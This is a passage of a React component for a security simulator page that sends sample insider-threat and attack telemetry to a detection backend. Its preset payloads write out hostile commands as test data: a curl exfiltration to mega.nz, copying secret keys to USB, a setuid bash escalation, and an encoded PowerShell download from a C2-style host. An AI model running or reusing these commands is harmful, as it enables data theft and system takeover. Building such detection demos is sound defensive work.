import React, { useState } from 'react';
import { XaiExplanationCard } from '../components/XaiExplanationCard';
import { MfaChallengeModal } from '../components/MfaChallengeModal';
import { 
  FlaskConical, 
  Play, 
  Flame, 
  Sliders, 
  Cpu, 
  Layers, 
  ShieldAlert, 
  ArrowRight,
  ShieldCheck,
  CheckCircle2,
  AlertTriangle,
  Lock,
  Activity,
  HardDrive,
  Clock,
  KeyRound
} from 'lucide-react';
import { useTheme } from '../context/ThemeContext';

export const SimulatorPage = ({ users, resources, devices, onRefreshData, onOpenCopilot }) => {
    const { isDark } = useTheme();
    // Preset execution states
    const [activeScenarioId, setActiveScenarioId] = useState(null);
    const [runningPreset, setRunningPreset] = useState(false);
    const [lastResult, setLastResult] = useState(null);

    // Custom simulator state
    const [selectedUserId, setSelectedUserId] = useState(users[2]?.id || users[0]?.id);
    const [selectedResourceId, setSelectedResourceId] = useState(resources[2]?.id || resources[0]?.id);
    const [selectedDeviceId, setSelectedDeviceId] = useState(devices[0]?.id || '');
    const [downloadMB, setDownloadMB] = useState(25);
    const [isOffHours, setIsOffHours] = useState(false);
    const [failedLogins, setFailedLogins] = useState(0);
    const [isPrivEscalation, setIsPrivEscalation] = useState(false);
    const [isUsbTransfer, setIsUsbTransfer] = useState(false);
    const [evaluatingCustom, setEvaluatingCustom] = useState(false);

    // MFA Challenge dialog simulation state
    const [mfaModalOpen, setMfaModalOpen] = useState(false);

    const selectedUser = users.find(u => u.id === selectedUserId) || users[0];
    const selectedResource = resources.find(r => r.id === selectedResourceId);

    // Preset Scenario Runner
    const runPresetScenario = async (scenarioId, name) => {
        try {
            setRunningPreset(true);
            setActiveScenarioId(scenarioId);
            const res = await fetch(`/api/simulation/scenario/${scenarioId}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            const data = await res.json();
            if (data.success) {
                setLastResult({
                    scenarioName: name,
                    event: data.event,
                    evaluation: data.decision.evaluation,
                    decision: data.decision,
                    user: data.user
                });
                onRefreshData();
                if (data.decision.requiresMfa) {
                    setMfaModalOpen(true);
                }
            }
        }
        catch (err) {
            console.error('Failed to execute preset scenario', err);
        }
        finally {
            setRunningPreset(false);
        }
    };

    // Real ML Pipeline Telemetry Ingestion Runner (POST /api/telemetry/ingest)
    const runTelemetryIngest = async (payload, name) => {
        try {
            setRunningPreset(true);
            setActiveScenarioId(payload.eventId);
            const res = await fetch('/api/telemetry/ingest', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            const data = await res.json();
            if (data.success) {
                const mappedUser = users.find(u => u.id === data.normalized?.userId) || users[0];
                setLastResult({
                    scenarioName: name,
                    event: {
                        id: data.eventId,
                        userId: mappedUser.id,
                        userName: mappedUser.name,
                        userEmail: mappedUser.email,
                        userDepartment: mappedUser.department,
                        timestamp: data.normalized.timestamp,
                        eventType: data.normalized.eventType,
                        resourceName: data.normalized.resourceName,
                        deviceName: data.normalized.deviceName,
                        riskContribution: data.riskAssessment.riskScore,
                        mlAnomalyScore: data.ml.mlAnomalyScore,
                        isAnomalous: data.ml.isAnomalous,
                        severity: data.normalized.severity,
                        metadata: {
                            ...data.normalized.rawMetadata,
                            supervisedProbability: data.ml.supervisedProbability,
                            isolationForestScore: data.ml.isolationForestScore,
                            contributingFeatures: data.ml.attributions?.map((a) => a.factor),
                            policyAction: data.policyDecision.decision
                        }
                    },
                    evaluation: {
                        userId: mappedUser.id,
                        riskScore: data.riskAssessment.riskScore,
                        riskLevel: data.riskAssessment.riskLevel,
                        trustScore: data.riskAssessment.trustScore,
                        contributingFactors: data.riskAssessment.contributingFactors,
                        recommendedAction: data.policyDecision.decision,
                        policyEnforced: data.policyDecision.decision,
                        mlAnomalyScore: data.ml.mlAnomalyScore,
                        explanationText: data.riskAssessment.explanationText,
                        timestamp: new Date().toISOString()
                    },
                    decision: data.policyDecision,
                    user: mappedUser
                });
                onRefreshData();
                if (data.policyDecision?.requiresMfa) {
                    setMfaModalOpen(true);
                }
            }
        }
        catch (err) {
            console.error('Failed to ingest telemetry:', err);
        }
        finally {
            setRunningPreset(false);
        }
    };

    // Custom Event Simulator Runner
    const runCustomSimulation = async () => {
        try {
            setEvaluatingCustom(true);
            const res = await fetch('/api/activity/simulate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    userId: selectedUserId,
                    resourceId: selectedResourceId,
                    deviceId: selectedDeviceId,
                    downloadSizeMB: downloadMB,
                    failedLoginCount: failedLogins,
                    isOffHours: isOffHours,
                    isCrossDepartment: selectedResource ? !selectedUser.baseline?.allowedDepartments?.includes(selectedResource.department) : false,
                    isPrivilegeEscalation: isPrivEscalation,
                    isUSBTransfer: isUsbTransfer,
                    eventType: isPrivEscalation ? 'PRIVILEGE_CHANGE' : (downloadMB > 100 ? 'FILE_DOWNLOAD' : 'RESOURCE_ACCESS')
                })
            });
            const data = await res.json();
            if (data.success) {
                setLastResult({
                    scenarioName: 'Custom Behavioral Synthesis',
                    event: data.event,
                    evaluation: data.decision.evaluation,
                    decision: data.decision,
                    user: data.user
                });
                onRefreshData();
                if (data.decision.requiresMfa) {
                    setMfaModalOpen(true);
                }
            }
        }
        catch (err) {
            console.error('Failed to run custom simulation', err);
        }
        finally {
            setEvaluatingCustom(false);
        }
    };

    return (
      <div className="space-y-8 font-['Plus_Jakarta_Sans',sans-serif]">
        {/* SECTION 1: Editorial Research Hero (Clean, Authoritative, Minimal) */}
        <section 
          id="simulator-hero"
          className={`border rounded-xl p-6 sm:p-8 relative overflow-hidden transition-colors ${
            isDark 
              ? 'bg-[#141414] border-[#2A2A2A] text-[#F4F4F6]' 
              : 'bg-[#FFFFFF] border-[#E5E5E5] text-[#111317] shadow-sm'
          }`}
        >
          {/* Subtle gold accent top line */}
          <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#C6A14A] to-transparent opacity-80" />

          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
            <div className="space-y-3 max-w-3xl">
              <div className="flex flex-wrap items-center gap-2.5">
                <span className="px-2.5 py-1 rounded-sm text-[10px] font-mono tracking-widest uppercase font-semibold border border-[#C6A14A]/40 text-[#C6A14A] bg-[#C6A14A]/10">
                  INTERACTIVE TESTING LAB
                </span>
                <span className="text-xs text-gray-500 dark:text-gray-400 font-mono flex items-center gap-1.5">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#C6A14A] animate-pulse" />
                  Continuous Risk &amp; Policy Evaluation Pipeline
                </span>
              </div>

              <h1 className="font-serif-display text-3xl sm:text-4xl font-light tracking-tight text-current leading-tight">
                Zero Trust &amp; UEBA Scenario Simulator
              </h1>

              <p className="text-sm text-gray-600 dark:text-gray-400 leading-relaxed font-sans max-w-2xl">
                Execute realistic enterprise security scenarios or synthesize custom event parameters to observe how the AI/ML model predicts behavioral anomalies and dynamically enforces Zero Trust access policies.
              </p>
            </div>

            {/* Quick Metrics/Status Indicator */}
            <div className={`shrink-0 p-4 rounded-lg border text-right font-mono text-xs space-y-1 ${
              isDark ? 'bg-[#0E0E0E] border-[#2A2A2A]' : 'bg-[#F7F4EC] border-[#E5E5E5]'
            }`}>
              <div className="text-[10px] uppercase tracking-wider text-gray-500">ENGINE STATUS</div>
              <div className="text-sm font-semibold text-[#C6A14A] flex items-center justify-end gap-1.5">
                <Activity className="w-3.5 h-3.5" />
                <span>ONLINE (RF + IF)</span>
              </div>
              <div className="text-[11px] text-gray-400">15k Trained Vectors</div>
            </div>
          </div>
        </section>

        {/* SECTION 2: Direct Telemetry Ingestion Gateway (POST /api/telemetry/ingest) */}
        <section 
          id="telemetry-pipeline-scenarios"
          className={`border rounded-xl p-6 sm:p-7 relative overflow-hidden transition-colors ${
            isDark 
              ? 'bg-[#141414] border-[#2A2A2A]' 
              : 'bg-[#FFFFFF] border-[#E5E5E5] shadow-sm'
          }`}
        >
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6 pb-4 border-b border-gray-200 dark:border-[#2A2A2A]">
            <div>
              <div className="flex items-center gap-2.5">
                <span className="px-2 py-0.5 rounded-xs border border-[#C6A14A]/40 text-[#C6A14A] bg-[#C6A14A]/10 text-[10px] font-mono font-bold tracking-wider uppercase">
                  POST /api/telemetry/ingest
                </span>
                <h2 className="font-serif-display text-xl sm:text-2xl font-normal text-current">
                  Real ML Pipeline Telemetry Scenarios
                </h2>
              </div>
              <p className="text-xs text-gray-500 dark:text-gray-400 mt-1 font-sans max-w-3xl">
                Test end-to-end telemetry ingestion through the real Supervised Random Forest (15,000-row dataset) + Isolation Forest ensemble, XAI attribution, dynamic risk engine, Zero Trust policy, and live SSE broadcast.
              </p>
            </div>
            <span className="text-xs font-mono text-[#C6A14A] border border-[#C6A14A]/30 px-3 py-1.5 rounded-sm bg-[#C6A14A]/5 whitespace-nowrap self-start sm:self-center font-medium">
              6 Production Benchmarks
            </span>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-3.5">
            {/* Test 1 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-norm-${Date.now()}`,
                userId: 'user-001',
                timestamp: new Date().toISOString(),
                user_department: 'Engineering',
                destination_site: 'github.com',
                bytes_sent_kb: 45,
                bytes_received_kb: 120,
                is_off_hours: 0,
                usb_bluetooth_usage: 0,
                failed_login_attempts: 0,
                application_shell_cmd: 'git pull'
              }, '1. Normal Office Login')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-[#C6A14A] hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-[#C6A14A] hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-emerald-500/30 text-emerald-500 font-bold block w-fit mb-2.5 bg-emerald-500/10">
                  ALLOW
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-[#C6A14A] transition-colors">
                  1. Normal Login
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  Office hours dev pull
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.08 • Risk: ~22
              </div>
            </button>

            {/* Test 2 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-offhours-${Date.now()}`,
                userId: 'user-002',
                timestamp: new Date().toISOString(),
                user_department: 'Finance',
                eventType: 'LOGIN',
                destination_site: 'sso.enterprise.corp',
                failed_login_attempts: 4,
                is_off_hours: 1,
                bytes_sent_kb: 2,
                bytes_received_kb: 10
              }, '2. Off-Hours Failed Logins')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-amber-500/60 hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-amber-500/60 hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-amber-500/30 text-amber-500 font-bold block w-fit mb-2.5 bg-amber-500/10">
                  APPROVE
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-amber-500 transition-colors">
                  2. Off-Hours Login
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  4 failed auths, off-hours
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.31 • Risk: ~85
              </div>
            </button>

            {/* Test 3 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-exfil-${Date.now()}`,
                userId: 'user-003',
                timestamp: new Date().toISOString(),
                user_department: 'Engineering',
                destination_site: 'mega.nz',
                bytes_sent_kb: 850000,
                bytes_received_kb: 1200,
                is_off_hours: 0,
                usb_bluetooth_usage: 0,
                failed_login_attempts: 0,
                application_shell_cmd: 'curl -F file=@db_dump.sql https://mega.nz/upload'
              }, '3. Large File Exfiltration')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-[#C6A14A] hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-[#C6A14A] hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-[#C6A14A]/40 text-[#C6A14A] font-bold block w-fit mb-2.5 bg-[#C6A14A]/10">
                  MFA STEP-UP
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-[#C6A14A] transition-colors">
                  3. Mass Exfil
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  850 MB egress mega.nz
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.35 • Risk: ~70
              </div>
            </button>

            {/* Test 4 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-usb-${Date.now()}`,
                userId: 'user-004',
                timestamp: new Date().toISOString(),
                user_department: 'Engineering',
                eventType: 'USB_ACTIVITY',
                destination_site: '/media/usb_drive',
                bytes_sent_kb: 350000,
                bytes_received_kb: 50,
                is_off_hours: 0,
                usb_bluetooth_usage: 1,
                failed_login_attempts: 0,
                application_shell_cmd: 'cp -r /opt/secret_keys /media/usb_drive/'
              }, '4. USB Removable Media Transfer')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-red-500/60 hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-red-500/60 hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-red-500/30 text-red-500 font-bold block w-fit mb-2.5 bg-red-500/10">
                  FREEZE
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-red-500 transition-colors">
                  4. USB Transfer
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  Physical USB mass copy
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.34 • Risk: ~94
              </div>
            </button>

            {/* Test 5 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-privesc-${Date.now()}`,
                userId: 'user-005',
                timestamp: new Date().toISOString(),
                user_department: 'IT',
                eventType: 'SHELL_EXECUTION',
                destination_site: 'localhost',
                bytes_sent_kb: 5,
                bytes_received_kb: 15,
                is_off_hours: 0,
                usb_bluetooth_usage: 0,
                failed_login_attempts: 0,
                application_shell_cmd: 'sudo chmod +s /bin/bash && sudo -i'
              }, '5. Privilege Escalation Attempt')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-[#C6A14A] hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-[#C6A14A] hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-amber-500/30 text-amber-500 font-bold block w-fit mb-2.5 bg-amber-500/10">
                  APPROVE
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-amber-500 transition-colors">
                  5. Privilege Esc
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  sudo chmod +s /bin/bash
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.23 • Risk: ~77
              </div>
            </button>

            {/* Test 6 */}
            <button 
              onClick={() => runTelemetryIngest({
                eventId: `tel-c2-${Date.now()}`,
                userId: 'user-001',
                timestamp: new Date().toISOString(),
                user_department: 'Engineering',
                eventType: 'SHELL_EXECUTION',
                destination_site: 'c2-beacon.darknet.onion',
                bytes_sent_kb: 4500,
                bytes_received_kb: 800,
                is_off_hours: 1,
                usb_bluetooth_usage: 0,
                failed_login_attempts: 0,
                application_shell_cmd: 'powershell -enc aQB3AHIAIAAtAHUAcgBpACAAaAB0AHQAcAA6AC8ALwBjADIALQBiAGUAYQBjAG8AbgAgAC0AbwB1AHQAZgBpAGwAZQAgAGMAYQBsAGMALgBlAHgAZQA='
              }, '6. Shell / C2 Beaconing')} 
              disabled={runningPreset} 
              className={`p-4 rounded-lg border text-left transition-all duration-200 group disabled:opacity-50 flex flex-col justify-between cursor-pointer ${
                isDark 
                  ? 'bg-[#0E0E0E] border-[#2A2A2A] hover:border-red-500/60 hover:bg-[#1A1A1A]' 
                  : 'bg-[#F9F9F7] border-[#E5E5E5] hover:border-red-500/60 hover:bg-[#FFFFFF] shadow-2xs hover:shadow-xs'
              }`}
            >
              <div>
                <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-red-500/30 text-red-500 font-bold block w-fit mb-2.5 bg-red-500/10">
                  AUTO-FREEZE
                </span>
                <div className="font-semibold text-xs text-current group-hover:text-red-500 transition-colors">
                  6. Shell / C2
                </div>
                <div className="text-[11px] text-gray-500 dark:text-gray-400 mt-1 line-clamp-2">
                  Darknet beaconing &amp; shell
                </div>
              </div>
              <div className="mt-4 text-[10px] font-mono text-[#C6A14A] pt-2.5 border-t border-gray-200 dark:border-[#2A2A2A]">
                RF: ~0.24 • Risk: ~99
              </div>
            </button>
          </div>
        </section>

        {/* SECTION 3: 8 Standard Enterprise & MITRE ATT&CK Presets Grid */}
        <section id="mitre-benchmark-scenarios" className="space-y-4">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
            <div className="flex items-center gap-3">
              <h2 className="font-serif-display text-2xl font-normal text-current">
                MITRE ATT&amp;CK &amp; Insider Threat Benchmark Scenarios
              </h2>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-xs border border-[#C6A14A]/40 text-[#C6A14A] bg-[#C6A14A]/10 font-bold">
                8 Scenarios
              </span>
            </div>
            <span className="text-xs text-gray-500 dark:text-gray-400 font-mono">
              Target User: Sarah Jenkins (EMP102, HR Specialist)
            </span>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
            {/* Scenario 1 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-[#C6A14A]/40' 
                : 'bg-white border-[#E5E5E5] hover:border-[#C6A14A]/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-[#C6A14A] px-2 py-0.5 rounded-xs border border-[#C6A14A]/30 bg-[#C6A14A]/10">
                    SCENARIO 1
                  </span>
                  <span className="text-[11px] font-mono text-emerald-500 font-semibold flex items-center gap-1">
                    <CheckCircle2 className="w-3 h-3" />
                    Normal
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Baseline Normal Access
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Approved corporate Dell laptop, regular work hours (11:30 AM), accessing standard HR Employee Portal with 14 MB download.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Device: <span className="font-semibold text-current">Corp-Dell-Latitude</span></div>
                  <div>Risk Expected: <span className="text-emerald-500 font-bold">&lt; 20 (ALLOW)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-1-normal', 'Scenario 1: Baseline Normal Access')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Play className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 1</span>
              </button>
            </div>

            {/* Scenario 2 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-amber-500/40' 
                : 'bg-white border-[#E5E5E5] hover:border-amber-500/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-amber-500 px-2 py-0.5 rounded-xs border border-amber-500/30 bg-amber-500/10">
                    SCENARIO 2
                  </span>
                  <span className="text-[11px] font-mono text-amber-500 font-semibold flex items-center gap-1">
                    <KeyRound className="w-3 h-3" />
                    MFA Step-Up
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Suspicious Off-Hours Login
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Unregistered device login at 03:15 AM from unusual foreign IP (Bucharest VPN). Elevated risk triggers dynamic MFA requirement.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Device: <span className="font-semibold text-amber-500">Unknown Tor/VPN</span></div>
                  <div>Risk Expected: <span className="text-amber-500 font-bold">~65 (REQUIRE MFA)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-2-suspicious-login', 'Scenario 2: Suspicious Off-Hours Login')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Play className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 2</span>
              </button>
            </div>

            {/* Scenario 3 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-red-500/40' 
                : 'bg-white border-[#E5E5E5] hover:border-red-500/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-red-500 px-2 py-0.5 rounded-xs border border-red-500/30 bg-red-500/10">
                    SCENARIO 3
                  </span>
                  <span className="text-[11px] font-mono text-red-500 font-semibold flex items-center gap-1">
                    <AlertTriangle className="w-3 h-3" />
                    Insider Threat
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Cross-Dept Exfiltration
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  EMP102 (HR) downloading 480 MB (500 records) of Executive Payroll Master (Finance) at 02:15 AM.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Resource: <span className="font-semibold text-red-500">Executive Payroll</span></div>
                  <div>Risk Expected: <span className="text-red-500 font-bold">~84 (RESTRICT &amp; HOLD)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-3-insider-exfiltration', 'Scenario 3: Insider Threat Cross-Dept Exfiltration')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Play className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 3</span>
              </button>
            </div>

            {/* Scenario 4 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-red-500/40' 
                : 'bg-white border-[#E5E5E5] hover:border-red-500/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-red-500 px-2 py-0.5 rounded-xs border border-red-500/30 bg-red-500/10">
                    SCENARIO 4
                  </span>
                  <span className="text-[11px] font-mono text-red-500 font-semibold flex items-center gap-1">
                    <Flame className="w-3 h-3" />
                    Compromise
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Critical Account Auto-Freeze
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  4 Failed logins + Domain privilege escalation + USB dump of 1.8 GB. Account auto-frozen &amp; SOC alerted.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Threats: <span className="font-semibold text-red-500">Priv-Esc + USB Exfil</span></div>
                  <div>Risk Expected: <span className="text-red-500 font-bold">96 (AUTO-FREEZE)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-4-critical-compromise', 'Scenario 4: Critical Account Compromise & Auto-Freeze')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-red-600 hover:bg-red-700 text-white border border-red-600 text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <Flame className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 4</span>
              </button>
            </div>

            {/* Scenario 5 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-[#C6A14A]/40' 
                : 'bg-white border-[#E5E5E5] hover:border-[#C6A14A]/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-[#C6A14A] px-2 py-0.5 rounded-xs border border-[#C6A14A]/30 bg-[#C6A14A]/10">
                    SCENARIO 5
                  </span>
                  <span className="text-[10px] font-mono text-[#C6A14A] font-bold border border-[#C6A14A]/30 px-1.5 py-0.5 rounded-xs bg-[#C6A14A]/5">
                    MITRE T1068
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  Privilege Escalation Attack
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Attempting unauthorized sudo role escalation to SYSTEM_ADMIN via command line on corporate workstation.
                </p>
                <div className={`text-[11px] font-mono space-y-1 mb-4 p-2.5 rounded-md border ${
                  isDark ? 'bg-[#0E0E0E] border-[#2A2A2A] text-gray-400' : 'bg-[#F9F9F7] border-[#E5E5E5] text-gray-600'
                }`}>
                  <div>Technique: <span className="font-semibold text-[#C6A14A]">Exploitation for Priv-Esc</span></div>
                  <div>Risk Expected: <span className="text-red-500 font-bold">&gt; 90 (RESTRICT / FREEZE)</span></div>
                </div>
              </div>

              <button 
                onClick={() => runPresetScenario('scenario-5-privilege-escalation', 'Scenario 5: Privilege Escalation Attack')} 
                disabled={runningPreset} 
                className="w-full py-2.5 px-3 rounded-md bg-[#C6A14A] hover:bg-[#B59139] text-black border border-[#C6A14A] text-xs font-mono font-bold tracking-wider transition-all flex items-center justify-center gap-1.5 disabled:opacity-50 cursor-pointer shadow-xs"
              >
                <ShieldAlert className="w-3.5 h-3.5"/>
                <span>SIMULATE SCENARIO 5</span>
              </button>
            </div>

            {/* Scenario 6 */}
            <div className={`border rounded-xl p-5 transition-all duration-200 flex flex-col justify-between ${
              isDark 
                ? 'bg-[#141414] border-[#2A2A2A] hover:border-[#C6A14A]/40' 
                : 'bg-white border-[#E5E5E5] hover:border-[#C6A14A]/40 shadow-xs'
            }`}>
              <div>
                <div className="flex items-center justify-between mb-3">
                  <span className="text-[10px] font-mono font-bold text-[#C6A14A] px-2 py-0.5 rounded-xs border border-[#C6A14A]/30 bg-[#C6A14A]/10">
                    SCENARIO 6
                  </span>
                  <span className="text-[10px] font-mono text-[#C6A14A] font-bold border border-[#C6A14A]/30 px-1.5 py-0.5 rounded-xs bg-[#C6A14A]/5">
                    MITRE T1052
                  </span>
                </div>
                <h3 className="font-serif-display text-lg font-medium text-current mb-1.5">
                  USB Physical Exfiltration
                </h3>
                <p className="text-xs text-gray-500 dark:text-gray-400 leading-relaxed mb-4 font-sans">
                  Physical transfer of 620 MB unencrypted employee payroll files to an unapproved external SanDisk USB drive.
                </p>
